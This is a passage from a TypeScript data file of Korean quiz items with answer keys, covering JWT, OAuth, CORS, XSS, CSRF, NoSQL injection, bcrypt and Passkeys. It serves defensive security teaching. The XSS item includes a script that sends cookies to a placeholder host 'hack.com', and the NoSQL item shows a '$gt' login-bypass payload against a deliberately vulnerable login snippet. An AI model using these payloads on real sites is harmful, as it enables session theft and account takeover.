import type { Problem } from '@/types'

export const authSecurityProblems: Problem[] = [
  // ─── JWT ─────────────────────────────────────────────────────────────────────

  {
    id: 'auth-q-001',
    category: 'auth-security',
    subcategory: 'jwt',
    type: 'multiple-choice',
    difficulty: 'easy',
    title: 'JWT 구조 — Header.Payload.Signature',
    description: '다음 JWT 토큰의 Payload(중간 부분)를 디코딩하면 나타나는 정보로 올바른 것은?\n\n`eyJhbGciOiJIUzI1NiJ9.eyJ1c2VySWQiOiIxMjMiLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE3MDAwMDB9.xxx`',
    options: [
      'Payload는 암호화되어 있어 디코딩해도 읽을 수 없다',
      'Payload는 Base64Url 인코딩이므로 디코딩하면 { userId: "123", role: "admin", iat: 1700000 } 같은 JSON이 나온다',
      'Payload에는 서버의 비밀 키가 저장된다',
      'Payload는 항상 빈 객체이다',
    ],
    correctAnswer: 1,
    explanation:
      'JWT Payload는 암호화(Encryption)가 아닌 Base64Url 인코딩만 되어 있어 누구나 디코딩해서 읽을 수 있습니다. 따라서 민감한 정보(비밀번호, 신용카드 등)를 Payload에 넣으면 안 됩니다. 무결성(변조 방지)은 Signature로 보장하지만, 기밀성(내용 숨김)은 JWT 자체로 제공되지 않습니다.',
    hints: ['Base64Url = 인코딩 (암호화 아님)', 'jwt.io에서 직접 디코딩 가능'],
    deepDive:
      'JWT 구조:\n• Header: { alg: "HS256", typ: "JWT" } — 서명 알고리즘\n• Payload: { sub: "userId", role: "admin", iat: 발급시각, exp: 만료시각 }\n• Signature: HMACSHA256(base64(header) + "." + base64(payload), secretKey)\n\nClaims(Payload 필드):\n• iss (Issuer): 토큰 발급자\n• sub (Subject): 토큰 대상 (userId)\n• aud (Audience): 토큰 수신자\n• exp (Expiration): 만료 시각 (Unix timestamp)\n• iat (Issued At): 발급 시각\n• nbf (Not Before): 이 시각 이전에는 무효\n\n보안 원칙:\n• Payload에 비밀번호/민감정보 절대 금지\n• 토큰 자체를 탈취당하면 만료 전까지 유효 → 짧은 만료 시간 설정\n• 서명 검증 필수: jwt.verify() (verify 없이 decode만 하면 위험)',
    relatedProblems: ['auth-q-002', 'auth-q-003'],
  },
  {
    id: 'auth-q-002',
    category: 'auth-security',
    subcategory: 'jwt',
    type: 'multiple-choice',
    difficulty: 'medium',
    title: 'Access Token vs Refresh Token',
    description: 'Access Token과 Refresh Token의 역할 분리가 필요한 이유는?',
    options: [
      'Access Token과 Refresh Token은 동일하며 단순히 이름만 다르다',
      'Access Token은 짧게 유지하여 탈취 피해를 최소화하고, Refresh Token은 길게 유지하여 사용자가 매번 로그인하지 않아도 되게 한다',
      'Refresh Token은 서버 메모리에만 저장되고 클라이언트에는 전달되지 않는다',
      'Access Token이 만료되면 자동으로 새 Access Token이 발급된다',
    ],
    correctAnswer: 1,
    explanation:
      'Access Token은 짧은 만료 시간(15분~1시간)으로 API 인증에 사용합니다. 탈취되어도 빠르게 만료됩니다. Refresh Token은 긴 만료 시간(7일~30일)으로 새 Access Token 발급에만 사용합니다. 이 분리로 보안(짧은 Access Token)과 편의성(Refresh로 재로그인 최소화)을 동시에 달성합니다.',
    hints: ['짧은 수명 + 긴 수명의 조합', '탈취 피해 최소화'],
    deepDive:
      'Token Rotation 패턴 (보안 강화):\n```\n1. 로그인 → Access Token(15분) + Refresh Token(7일) 발급\n2. API 호출 시 Access Token 헤더 첨부\n3. Access Token 만료 → Refresh Token으로 갱신 요청\n4. 서버: Refresh Token 검증 → 새 Access Token + 새 Refresh Token 발급\n   (Refresh Token Rotation: 이전 RT는 무효화)\n5. Refresh Token도 만료 → 재로그인\n```\n\nRefresh Token 저장 위치:\n• httpOnly Cookie (권장): JS 접근 불가, CSRF 방어 필요\n• localStorage (비권장): XSS 공격에 노출\n\nNestJS 구현:\n```typescript\n// Access Token 발급\njwtService.sign(payload, { expiresIn: "15m" })\n// Refresh Token 발급\njwtService.sign(payload, { expiresIn: "7d", secret: RT_SECRET })\n```',
    relatedProblems: ['auth-q-001', 'auth-q-003', 'auth-q-004'],
  },
  {
    id: 'auth-q-003',
    category: 'auth-security',
    subcategory: 'jwt',
    type: 'multiple-choice',
    difficulty: 'medium',
    title: 'JWT 저장 위치 — localStorage vs httpOnly Cookie',
    description: 'JWT를 localStorage에 저장하는 것과 httpOnly Cookie에 저장하는 것의 보안 차이는?',
    options: [
      'localStorage가 더 안전하다. 서버만 접근할 수 있기 때문이다',
      'httpOnly Cookie가 더 안전하다. JavaScript에서 접근할 수 없어 XSS 공격으로 토큰을 탈취할 수 없다',
      '두 방식의 보안은 동일하다',
      'Cookie는 HTTPS에서만 작동한다',
    ],
    correctAnswer: 1,
    explanation:
      'httpOnly Cookie는 JavaScript로 접근 불가(document.cookie로 읽을 수 없음)하여 XSS 공격에서 토큰이 탈취되지 않습니다. localStorage는 XSS 취약점이 있으면 `localStorage.getItem("token")`으로 바로 탈취됩니다. 단, httpOnly Cookie는 CSRF 공격에 취약하므로 SameSite=Strict/Lax 또는 CSRF Token을 함께 사용해야 합니다.',
    hints: ['XSS = JavaScript 코드 주입 공격', 'httpOnly = JS 접근 불가'],
    deepDive:
      '저장 위치별 비교:\n\nlocalStorage:\n• XSS에 취약 (공격자 JS로 바로 탈취 가능)\n• CSRF에 안전 (자동 전송 안 됨)\n• SPA에서 구현 쉬움\n\nhttpOnly Cookie:\n• XSS에 안전 (JS 접근 불가)\n• CSRF에 취약 (자동 전송됨) → SameSite 속성으로 방어\n• Secure 플래그: HTTPS에서만 전송\n\n권장 설정:\n```typescript\n// NestJS에서 httpOnly Cookie 설정\nres.cookie("refreshToken", token, {\n  httpOnly: true,    // JS 접근 불가\n  secure: true,      // HTTPS만\n  sameSite: "strict", // CSRF 방어\n  maxAge: 7 * 24 * 60 * 60 * 1000,  // 7일\n})\n```\n\nNext.js App Router: httpOnly Cookie는 Server Action에서 설정 권장',
    relatedProblems: ['auth-q-001', 'auth-q-002', 'auth-q-009', 'auth-q-010'],
  },
  {
    id: 'auth-q-004',
    category: 'auth-security',
    subcategory: 'jwt',
    type: 'multiple-choice',
    difficulty: 'hard',
    title: 'JWT 만료 처리 패턴',
    description: 'Access Token이 만료된 401 응답을 받았을 때 클라이언트(Next.js)가 처리하는 올바른 패턴은?',
    options: [
      '401을 받으면 즉시 로그인 페이지로 리다이렉트한다',
      '401을 받으면 Refresh Token으로 새 Access Token을 발급 시도하고, 실패하면 로그인으로 리다이렉트한다',
      'Access Token은 만료되지 않도록 무한 유효기간으로 발급한다',
      'Access Token이 만료되면 자동으로 서버가 새 토큰을 응답 헤더에 넣어준다',
    ],
    correctAnswer: 1,
    explanation:
      '올바른 패턴: ① API 요청 → 401 수신 → ② Refresh Token으로 /auth/refresh 요청 → ③ 새 Access Token 발급 성공 → 원래 요청 재시도 → ④ Refresh Token도 만료되면 로그인 페이지로. 이 로직을 axios interceptor나 fetch wrapper에서 구현하면 모든 API 호출에 자동 적용됩니다.',
    hints: ['Refresh Token이 있는 이유', '요청 재시도가 포인트'],
    deepDive:
      '```typescript\n// axios interceptor로 자동 token refresh\naxios.interceptors.response.use(\n  (response) => response,\n  async (error) => {\n    const originalRequest = error.config\n\n    // 401이고 아직 재시도 안 했을 때\n    if (error.response?.status === 401 && !originalRequest._retry) {\n      originalRequest._retry = true\n\n      try {\n        // Refresh Token으로 새 AT 발급\n        const { data } = await axios.post("/auth/refresh")\n        const newAccessToken = data.accessToken\n\n        // 헤더 업데이트\n        axios.defaults.headers.common["Authorization"] = `Bearer ${newAccessToken}`\n        originalRequest.headers["Authorization"] = `Bearer ${newAccessToken}`\n\n        // 원래 요청 재시도\n        return axios(originalRequest)\n      } catch (refreshError) {\n        // Refresh도 실패 → 로그인으로\n        window.location.href = "/login"\n        return Promise.reject(refreshError)\n      }\n    }\n\n    return Promise.reject(error)\n  }\n)\n```',
    relatedProblems: ['auth-q-002', 'auth-q-005'],
  },

  // ─── OAuth / 인증 흐름 ────────────────────────────────────────────────────────

  {
    id: 'auth-q-005',
    category: 'auth-security',
    subcategory: 'oauth',
    type: 'multiple-choice',
    difficulty: 'medium',
    title: 'OAuth 2.0 Authorization Code Flow',
    description: 'Google 소셜 로그인(OAuth 2.0)의 올바른 흐름 순서는?',
    options: [
      '사용자 → 서버에 비밀번호 전달 → 서버가 Google에 대신 로그인',
      '사용자 → Google 로그인 페이지 → Authorization Code 발급 → 서버가 Code를 Access Token으로 교환 → Google 사용자 정보 조회',
      '사용자 → Google에서 바로 Access Token 발급 → 클라이언트에서 Google API 직접 호출',
      '서버 → Google에 사용자 정보 요청 → Google이 직접 사용자에게 토큰 전달',
    ],
    correctAnswer: 1,
    explanation:
      'Authorization Code Flow: ① 사용자가 "Google로 로그인" 클릭 → ② Google 로그인/동의 페이지로 리다이렉트 → ③ 사용자 동의 → Google이 Authorization Code를 redirect_uri로 전달 → ④ 서버(백엔드)가 Code + Client Secret으로 Google에 Access Token 교환 요청 → ⑤ Access Token으로 Google 사용자 정보 조회 → ⑥ 자체 JWT 발급. Code를 서버에서 교환하는 이유: Client Secret이 클라이언트에 노출되지 않도록.',
    hints: ['Authorization Code = 중간 단계 코드', 'Client Secret은 서버에서만'],
    deepDive:
      'Authorization Code Flow (PKCE 포함):\n```\n클라이언트 → 서버: "Google 로그인 URL 주세요"\n서버 → 클라이언트: https://accounts.google.com/o/oauth2/auth?\n  client_id=xxx&redirect_uri=xxx&scope=email+profile&response_type=code\n\n사용자가 Google에서 로그인 + 동의\n\nGoogle → 클라이언트(redirect_uri): ?code=AUTHORIZATION_CODE\n\n클라이언트 → 서버: code 전달\n서버 → Google: POST /token { code, client_secret, grant_type }\nGoogle → 서버: { access_token, refresh_token, id_token }\n\n서버: Google API로 사용자 정보 조회\n서버 → 클라이언트: 자체 JWT 발급\n```\n\nNextAuth.js는 이 전체 흐름을 자동 처리합니다.',
    relatedProblems: ['auth-q-006', 'auth-q-007'],
  },
  {
    id: 'auth-q-006',
    category: 'auth-security',
    subcategory: 'oauth',
    type: 'multiple-choice',
    difficulty: 'medium',
    title: 'OAuth vs OpenID Connect (OIDC)',
    description: 'OAuth 2.0과 OpenID Connect(OIDC)의 차이로 올바른 것은?',
    options: [
      'OAuth와 OIDC는 완전히 동일한 프로토콜이다',
      'OAuth 2.0은 인가(Authorization/리소스 접근 권한) 프로토콜이고, OIDC는 OAuth 위에 인증(Authentication/사용자 신원 확인)을 추가한 것이다',
      'OIDC는 OAuth보다 오래된 구버전 프로토콜이다',
      'OAuth는 사용자 로그인에만 사용할 수 있다',
    ],
    correctAnswer: 1,
    explanation:
      'OAuth 2.0은 "A 서비스가 B 서비스의 리소스에 접근하는 권한"을 위한 인가(Authorization) 프로토콜입니다. 원래 "이 사람이 누구인가(신원 확인)"를 위한 프로토콜이 아닙니다. OIDC(OpenID Connect)는 OAuth 2.0 위에 ID Token(JWT)과 UserInfo 엔드포인트를 추가하여 인증(Authentication)도 처리합니다. Google/Kakao 소셜 로그인은 대부분 OIDC를 사용합니다.',
    hints: ['OAuth = 권한 위임, OIDC = 신원 확인 추가'],
    deepDive:
      '구분 예시:\n• OAuth만 사용: "내 앱이 사용자의 Google Drive에 접근할 수 있도록 허락받기"\n• OIDC 사용: "Google 계정으로 내 서비스에 로그인하기 (신원 확인)"\n\nID Token (OIDC):\n• JWT 형식\n• Payload: sub(사용자 ID), email, name, picture 등\n• 서버가 ID Token을 검증하여 사용자 신원 확인\n\nNextAuth.js: 내부적으로 OIDC를 사용\n```typescript\n// NextAuth providers\nGoogleProvider({  // OIDC 사용\n  clientId: process.env.GOOGLE_ID!,\n  clientSecret: process.env.GOOGLE_SECRET!,\n})\n```',
    relatedProblems: ['auth-q-005', 'auth-q-007'],
  },
  {
    id: 'auth-q-007',
    category: 'auth-security',
    subcategory: 'session-cookie',
    type: 'multiple-choice',
    difficulty: 'medium',
    title: 'Session vs JWT Token 방식 비교',
    description: 'Session 방식과 JWT 방식의 차이로 올바른 것은?',
    options: [
      'Session은 클라이언트에, JWT는 서버에 상태를 저장한다',
      'Session은 서버 DB/메모리에 상태를 저장(stateful)하고, JWT는 토큰 자체에 정보를 포함(stateless)한다',
      'JWT는 로그아웃을 지원하지 않는다 (불가능하다)',
      'Session 방식이 항상 더 빠르다',
    ],
    correctAnswer: 1,
    explanation:
      'Session은 서버(DB, Redis, 메모리)에 세션 데이터를 저장하고 클라이언트는 Session ID만 Cookie로 가집니다(Stateful). JWT는 토큰 자체에 사용자 정보와 만료 시간을 포함하여 서버가 별도 저장소 없이 검증합니다(Stateless). JWT도 Blacklist(Redis에 무효화된 토큰 저장)로 로그아웃을 구현할 수 있습니다.',
    hints: ['Stateful vs Stateless', '서버가 상태를 저장하는가?'],
    deepDive:
      'Session vs JWT 선택 기준:\n\nSession(Stateful):\n✅ 즉시 로그아웃/무효화 가능\n✅ 세션 데이터 서버에서 직접 수정 가능\n❌ 서버 확장 시 세션 공유 필요 (Redis Sticky Session)\n❌ 서버 부하 (모든 요청마다 DB 조회)\n\nJWT(Stateless):\n✅ 서버 확장 용이 (어느 서버도 검증 가능)\n✅ 서버 부하 적음 (DB 조회 불필요)\n❌ 토큰 탈취 시 만료 전까지 무효화 어려움\n❌ Payload 수정 불가 (새 토큰 발급 필요)\n\n실무:\n• MSA/수평 확장 → JWT\n• 즉각적인 권한 제어 필요 → Session + Redis\n• NextAuth.js: 기본 Session 방식, JWT 방식 선택 가능',
    relatedProblems: ['auth-q-001', 'auth-q-003'],
  },

  // ─── 웹 보안 ─────────────────────────────────────────────────────────────────

  {
    id: 'auth-q-008',
    category: 'auth-security',
    subcategory: 'web-security',
    type: 'multiple-choice',
    difficulty: 'medium',
    title: 'CORS — 원인과 해결',
    description: 'CORS 에러가 발생하는 이유와 해결 방법으로 올바른 것은?',
    options: [
      'CORS는 서버가 다운됐을 때 발생하는 에러다',
      '브라우저가 다른 Origin(프로토콜+도메인+포트)으로의 요청을 기본 차단하며, 서버가 허용 Origin을 응답 헤더에 포함해야 해결된다',
      'CORS는 클라이언트에서 해결해야 하며 서버와 무관하다',
      'HTTPS를 사용하면 CORS가 자동으로 해결된다',
    ],
    correctAnswer: 1,
    explanation:
      'CORS(Cross-Origin Resource Sharing)는 브라우저의 Same-Origin Policy 때문에 발생합니다. localhost:3000에서 localhost:8000으로 요청하면 포트가 달라 다른 Origin으로 간주되어 차단됩니다. 서버가 Access-Control-Allow-Origin 헤더에 허용할 Origin을 명시해야 합니다. CORS는 서버에서 해결해야 합니다.',
    hints: ['Same-Origin Policy = 브라우저의 보안 정책', '서버에서 허용 설정 필요'],
    deepDive:
      'CORS 해결:\n```typescript\n// NestJS\nimport { NestFactory } from "@nestjs/core"\nconst app = await NestFactory.create(AppModule)\napp.enableCors({\n  origin: ["http://localhost:3000", "https://myapp.com"],\n  methods: ["GET", "POST", "PUT", "PATCH", "DELETE"],\n  allowedHeaders: ["Content-Type", "Authorization"],\n  credentials: true,  // Cookie 포함 요청 허용\n})\n\n// Next.js API Routes\nexport async function GET(req: Request) {\n  return NextResponse.json(data, {\n    headers: { "Access-Control-Allow-Origin": "https://myapp.com" },\n  })\n}\n```\n\nPreflight Request (OPTIONS):\n• 브라우저가 실제 요청 전에 OPTIONS 메서드로 서버에 허용 여부 확인\n• 발생 조건: 커스텀 헤더, PUT/DELETE, Content-Type이 multipart 등\n• 서버가 OPTIONS에 200 응답 + Access-Control 헤더 포함해야 함\n\n✋ credentials: true면 Access-Control-Allow-Origin: * 사용 불가!',
    relatedProblems: ['auth-q-009', 'auth-q-010'],
  },
  {
    id: 'auth-q-009',
    category: 'auth-security',
    subcategory: 'web-security',
    type: 'multiple-choice',
    difficulty: 'medium',
    title: 'XSS — Cross-Site Scripting',
    description: '다음 중 XSS(Cross-Site Scripting) 공격에 해당하는 것은?',
    options: [
      '공격자가 다른 사이트에서 사용자 모르게 폼을 제출하는 공격',
      '공격자가 악성 JavaScript를 웹 페이지에 삽입하여 사용자 브라우저에서 실행되게 하는 공격',
      '공격자가 SQL 쿼리를 조작하여 DB를 탈취하는 공격',
      '서버에 대량의 요청을 보내 서비스를 마비시키는 공격',
    ],
    correctAnswer: 1,
    explanation:
      'XSS는 공격자가 악성 JavaScript를 웹 페이지에 삽입하여 피해자 브라우저에서 실행되게 하는 공격입니다. 쿠키/localStorage 탈취, 키로거 설치, 피싱 페이지 표시 등이 가능합니다. 선택지 1은 CSRF, 3은 SQL Injection, 4는 DDoS입니다.',
    hints: ['X = Cross-Site, S = Scripting = 스크립트 주입'],
    deepDive:
      'XSS 유형:\n• Stored XSS: DB에 저장된 악성 스크립트가 페이지 렌더링 시 실행\n  예: 게시판에 `<script>document.location="hack.com?c="+document.cookie</script>` 저장\n• Reflected XSS: URL 파라미터의 악성 스크립트가 응답에 그대로 반영\n  예: /search?q=<script>alert(1)</script>\n• DOM XSS: 클라이언트 JavaScript가 안전하지 않게 DOM 조작\n\n방어:\n```typescript\n// 1. React/Next.js의 기본 이스케이프 (JSX)\n<div>{userInput}</div>  // 자동 이스케이프 ✅\n<div dangerouslySetInnerHTML={{__html: userInput}} />  // XSS 위험! ❌\n\n// 2. 입력값 검증 및 새니타이징\nimport DOMPurify from "dompurify"\nconst clean = DOMPurify.sanitize(userInput)\n\n// 3. Content-Security-Policy 헤더\n"Content-Security-Policy": "script-src \'self\'"\n\n// 4. httpOnly Cookie (XSS로 토큰 탈취 방지)\n```',
    relatedProblems: ['auth-q-003', 'auth-q-010'],
  },
  {
    id: 'auth-q-010',
    category: 'auth-security',
    subcategory: 'web-security',
    type: 'multiple-choice',
    difficulty: 'medium',
    title: 'CSRF — Cross-Site Request Forgery',
    description: 'CSRF 공격과 SameSite Cookie로 방어하는 원리로 올바른 것은?',
    options: [
      'CSRF는 서버 직접 해킹이며 SameSite는 암호화로 방어한다',
      '사용자가 로그인된 상태에서 다른 사이트의 악성 폼/링크가 사용자 권한으로 요청을 보내는 공격이며, SameSite=Strict/Lax Cookie로 다른 사이트에서의 쿠키 전송을 차단한다',
      'CSRF는 XSS와 동일한 공격이다',
      'HTTPS를 사용하면 CSRF가 자동 방어된다',
    ],
    correctAnswer: 1,
    explanation:
      'CSRF: 사용자가 bank.com에 로그인된 상태에서 evil.com을 방문하면, evil.com의 악성 코드가 bank.com/transfer로 요청을 보냅니다. 브라우저가 자동으로 bank.com 쿠키를 첨부하므로 서버는 정상 요청으로 인식합니다. SameSite=Strict: 다른 Origin에서의 요청에 쿠키를 전혀 포함하지 않음. SameSite=Lax: GET 제외 다른 Origin 요청에 쿠키 미포함.',
    hints: ['사용자 쿠키가 자동으로 전송되는 것을 이용'],
    deepDive:
      'CSRF 방어 방법:\n\n1. SameSite Cookie (권장):\n```typescript\nres.cookie("sessionId", token, {\n  sameSite: "strict",  // 다른 사이트 요청 시 쿠키 미전송\n  httpOnly: true,\n  secure: true,\n})\n```\n\n2. CSRF Token:\n• 서버가 랜덤 토큰 생성 → 폼에 hidden 필드로 포함\n• 요청 시 헤더/바디에 포함 → 서버 검증\n• evil.com은 이 토큰을 알 수 없음\n\n3. Origin/Referer 헤더 검증:\n• 서버가 요청의 Origin이 허용된 도메인인지 확인\n\nXSS vs CSRF 구분:\n• XSS: 공격 코드가 피해 사이트에서 실행됨 → 쿠키/토큰 탈취\n• CSRF: 공격 코드가 다른 사이트에서 실행됨 → 쿠키 자동 전송 이용',
    relatedProblems: ['auth-q-003', 'auth-q-009'],
  },
  {
    id: 'auth-q-011',
    category: 'auth-security',
    subcategory: 'web-security',
    type: 'multiple-choice',
    difficulty: 'hard',
    title: 'NoSQL Injection — MongoDB',
    description: '다음 코드에서 발생할 수 있는 보안 취약점은?',
    code: `// 사용자 로그인 API
app.post("/login", async (req, res) => {
  const { email, password } = req.body
  const user = await User.findOne({ email, password })
  if (user) res.json({ success: true })
})`,
    options: [
      '성능 문제만 있을 뿐 보안 취약점은 없다',
      'NoSQL Injection 취약점. 공격자가 { "$gt": "" }를 body에 주입하면 모든 사용자가 로그인될 수 있다',
      'SQL Injection만 가능하고 MongoDB는 안전하다',
      'password가 평문이므로 DB 유출 시 위험하지만 로그인 우회는 불가능하다',
    ],
    correctAnswer: 1,
    explanation:
      '공격자가 `{ "email": "admin@example.com", "password": { "$gt": "" } }`를 전송하면 MongoDB 쿼리가 `{ email: "admin@example.com", password: { $gt: "" } }`가 되어 비밀번호가 빈 문자열보다 크면(=항상 참) 로그인이 성공합니다. 평문 비밀번호 저장도 심각한 문제입니다.',
    hints: ['MongoDB 연산자($gt, $ne 등)가 body에 올 수 있다면?'],
    deepDive:
      '방어 방법:\n```typescript\n// 1. express-mongo-sanitize 사용\nimport mongoSanitize from "express-mongo-sanitize"\napp.use(mongoSanitize())  // $ 시작 키를 자동 제거\n\n// 2. 입력값 타입 검증 (class-validator)\nexport class LoginDto {\n  @IsEmail()\n  email: string\n\n  @IsString()  // 객체 형태 거부\n  password: string\n}\n\n// 3. bcrypt로 비밀번호 해시 저장 후 비교\nconst user = await User.findOne({ email }).select("+password")\nconst isMatch = await bcrypt.compare(password, user.password)\n// bcrypt.compare는 해시 비교이므로 injection 불가\n\n// 4. 직접 연산자 필터링\nif (typeof password !== "string") throw new BadRequestException()\n```\n\nNestJS + class-validator + ValidationPipe(whitelist:true)를 사용하면 대부분의 NoSQL Injection을 차단할 수 있습니다.',
    relatedProblems: ['auth-q-012', 'be-q-009'],
  },
  {
    id: 'auth-q-012',
    category: 'auth-security',
    subcategory: 'web-security',
    type: 'multiple-choice',
    difficulty: 'medium',
    title: 'Password Hashing — bcrypt, salt, rainbow table',
    description: 'bcrypt로 비밀번호를 해시할 때 salt를 사용하는 이유는?',
    options: [
      'salt는 비밀번호를 암호화하여 원본 복원을 막는다',
      '같은 비밀번호라도 다른 해시를 생성하여 Rainbow Table 공격(미리 계산된 해시 테이블로 역추적)을 방어한다',
      'salt는 해시 속도를 빠르게 한다',
      'salt가 없으면 bcrypt를 사용할 수 없다',
    ],
    correctAnswer: 1,
    explanation:
      'salt는 각 비밀번호에 추가되는 랜덤 값으로, 같은 "password123"이라도 salt가 다르면 완전히 다른 해시가 생성됩니다. Rainbow Table(해시 → 원본 매핑 테이블)은 salt 없이 생성된 해시에만 효과적입니다. bcrypt는 salt를 자동으로 생성하고 해시에 포함시키므로 별도로 저장할 필요가 없습니다.',
    hints: ['같은 입력 + 다른 salt = 다른 해시', 'Rainbow Table = 미리 계산된 해시 목록'],
    deepDive:
      '```typescript\nimport * as bcrypt from "bcrypt"\n\n// 해시 생성 (saltRounds = cost factor)\nconst saltRounds = 10  // 2^10번 해시 반복 → 브루트포스 방어\nconst hash = await bcrypt.hash("password123", saltRounds)\n// "$2b$10$N9qo8uLOickgx2ZMRZoMyeIjZAgcfl7p92ldGxad68LJZdL17lhWy"\n// $2b$ = bcrypt 버전\n// $10$ = cost factor\n// 나머지 = salt(22자) + hash\n\n// 검증 (salt는 해시 안에 포함되어 있음)\nconst isMatch = await bcrypt.compare("password123", hash)  // true\n\n// Mongoose pre("save") 훅에서 사용\nuserSchema.pre("save", async function(next) {\n  if (this.isModified("password")) {\n    this.password = await bcrypt.hash(this.password, 10)\n  }\n  next()\n})\n```\n\nbcrypt vs argon2:\n• bcrypt: 널리 사용, 안정적\n• argon2: 더 현대적, 메모리-하드 (GPU 공격 방어), 권장\n• 절대 금지: MD5, SHA1로 비밀번호 해시 (빠르기 때문에 브루트포스에 취약)',
    relatedProblems: ['auth-q-011', 'db-q-009'],
  },

  // ─── 생체 인식 / Passkeys / WebAuthn ────────────────────────────────────────

  {
    id: 'auth-q-013',
    category: 'auth-security',
    subcategory: 'biometric',
    type: 'multiple-choice',
    difficulty: 'medium',
    title: 'WebAuthn / Passkeys — 핵심 원리',
    description: 'Passkeys(WebAuthn)가 기존 비밀번호 방식보다 안전한 핵심 이유는?',
    options: [
      '비밀번호를 더 길고 복잡하게 암호화하여 서버에 저장하는 방식이다',
      '공개키/개인키 쌍을 사용하며, 개인키는 기기 밖으로 절대 나가지 않고 생체 정보도 서버에 전송되지 않는다',
      '생체 정보(지문, 얼굴)를 서버에 안전하게 저장하여 매번 비교한다',
      'Passkeys는 비밀번호와 생체 정보를 함께 조합하여 더 강력한 해시를 만든다',
    ],
    correctAnswer: 1,
    explanation:
      'Passkeys는 공개키 암호화(Public Key Cryptography) 기반입니다. 등록 시 기기에서 공개키/개인키 쌍이 생성되고, 공개키만 서버에 저장됩니다. 인증 시 서버가 챌린지(랜덤값)를 보내면, 기기가 개인키로 서명하여 응답합니다. 생체 인식(지문/Face ID)은 개인키를 기기 안에서 꺼내는 열쇠 역할만 하며, 생체 데이터 자체는 기기 밖으로 나가지 않습니다. 서버 유출 시에도 공개키만 노출되어 안전합니다.',
    hints: ['공개키는 서버에, 개인키는 기기에', '생체 데이터 = 기기 로컬에서만'],
    deepDive:
      'WebAuthn 인증 흐름:\n\n[등록]\n1. 서버 → 클라이언트: challenge(랜덤값) 전달\n2. 브라우저: `navigator.credentials.create()` 호출\n3. OS/기기: 생체 인식으로 사용자 확인 → 공개키/개인키 쌍 생성\n4. 기기: 공개키 + attestation(기기 증명) → 서버 전달\n5. 서버: 공개키 저장\n\n[인증]\n1. 서버 → 클라이언트: challenge 전달\n2. 브라우저: `navigator.credentials.get()` 호출\n3. OS/기기: 생체 인식으로 개인키 잠금 해제\n4. 기기: 개인키로 challenge에 서명(signature) → 서버 전달\n5. 서버: 저장된 공개키로 서명 검증 → 인증 성공\n\n보안 장점:\n• 피싱 불가: 개인키는 등록된 도메인에서만 사용됨 (origin binding)\n• 서버 유출 무의미: 공개키만 저장, 개인키는 기기에\n• 생체 데이터 미전송: 지문/얼굴은 기기 보안 칩(Secure Enclave)에만 존재\n• 재사용 공격 불가: 매번 다른 challenge 서명',
    relatedProblems: ['auth-q-014', 'auth-q-015'],
  },
  {
    id: 'auth-q-014',
    category: 'auth-security',
    subcategory: 'biometric',
    type: 'multiple-choice',
    difficulty: 'hard',
    title: 'navigator.credentials API — 등록 vs 인증',
    description: '다음 코드에서 각 단계의 역할로 올바른 것은?',
    code: `// 등록 (Registration)
const credential = await navigator.credentials.create({
  publicKey: {
    challenge: serverChallenge,          // A
    rp: { name: "MyApp", id: "myapp.com" },
    user: { id: userId, name: userEmail, displayName: "홍길동" },
    pubKeyCredParams: [{ alg: -7, type: "public-key" }],  // B
    authenticatorSelection: {
      userVerification: "required",      // C
    },
  },
})

// 인증 (Authentication)
const assertion = await navigator.credentials.get({
  publicKey: {
    challenge: serverChallenge,
    rpId: "myapp.com",
    allowCredentials: [{ id: credentialId, type: "public-key" }],
    userVerification: "required",
  },
})`,
    options: [
      'A=서버 비밀키, B=암호화 방식, C=2FA 필요 여부',
      'A=리플레이 공격 방지용 랜덤값, B=지원할 공개키 알고리즘(-7=ES256), C=생체/PIN으로 사용자 직접 확인 필수 여부',
      'A=세션 토큰, B=해시 반복 횟수, C=관리자 권한 여부',
      'A=챌린지는 선택 사항이며 없어도 된다, B=-7은 RSA 알고리즘, C=원격 인증 허용 여부',
    ],
    correctAnswer: 1,
    explanation:
      'challenge: 서버가 생성한 랜덤 바이트값으로, 매 요청마다 새로 생성되어 재사용 공격(Replay Attack)을 방지합니다. pubKeyCredParams의 alg: -7은 COSE 알고리즘 식별자로 ES256(ECDSA with SHA-256)을 의미합니다. alg: -257은 RS256(RSA)입니다. userVerification: "required"는 생체 인식 또는 PIN으로 사용자를 반드시 확인해야 함을 의미합니다.',
    hints: ['challenge = 매번 새로운 랜덤값', 'alg -7 = ES256 (Elliptic Curve)'],
    deepDive:
      'WebAuthn 주요 옵션:\n\n등록 옵션:\n```typescript\npubKeyCredParams: [\n  { alg: -7, type: "public-key" },   // ES256 (권장)\n  { alg: -257, type: "public-key" }, // RS256 (호환성)\n]\n\nauthenticatorSelection: {\n  authenticatorAttachment: "platform",  // 기기 내장 인증기 (Face ID, Touch ID)\n  // authenticatorAttachment: "cross-platform",  // 외부 인증기 (YubiKey)\n  residentKey: "required",    // Passkey: 기기에 credential 저장 (사용자명 불필요)\n  userVerification: "required",  // 생체/PIN 필수\n}\n```\n\n인증 결과 처리 (서버):\n```typescript\n// 서버에서 검증 (simplewebauthn 라이브러리 사용)\nimport { verifyRegistrationResponse, verifyAuthenticationResponse } from "@simplewebauthn/server"\n\n// 등록 검증\nconst verification = await verifyRegistrationResponse({\n  response: credential,\n  expectedChallenge,\n  expectedOrigin: "https://myapp.com",\n  expectedRPID: "myapp.com",\n})\n\n// 인증 검증\nconst verification = await verifyAuthenticationResponse({\n  response: assertion,\n  expectedChallenge,\n  authenticator: storedCredential,  // DB에서 꺼낸 공개키\n  expectedOrigin: "https://myapp.com",\n  expectedRPID: "myapp.com",\n})\n```\n\n추천 라이브러리: @simplewebauthn/browser (클라이언트), @simplewebauthn/server (서버)',
    relatedProblems: ['auth-q-013', 'auth-q-015'],
  },
  {
    id: 'auth-q-015',
    category: 'auth-security',
    subcategory: 'biometric',
    type: 'multiple-choice',
    difficulty: 'medium',
    title: 'Passkeys vs 비밀번호 — 보안 비교',
    description: 'Passkeys가 기존 비밀번호+2FA 방식 대비 갖는 장점으로 올바르지 않은 것은?',
    options: [
      'Passkeys는 피싱 공격에 면역이다. 개인키가 등록된 도메인(RP ID)에서만 동작하므로 가짜 사이트에서는 사용 불가능하다',
      'Passkeys는 서버 DB가 해킹되어도 공개키만 노출되므로 계정이 탈취되지 않는다',
      'Passkeys는 오프라인 환경에서도 동작하지 않는다. 인증마다 서버와 실시간 통신이 필요하다',
      'Passkeys는 비밀번호 재사용 문제가 없다. 각 서비스마다 고유한 키 쌍이 생성된다',
    ],
    correctAnswer: 2,
    explanation:
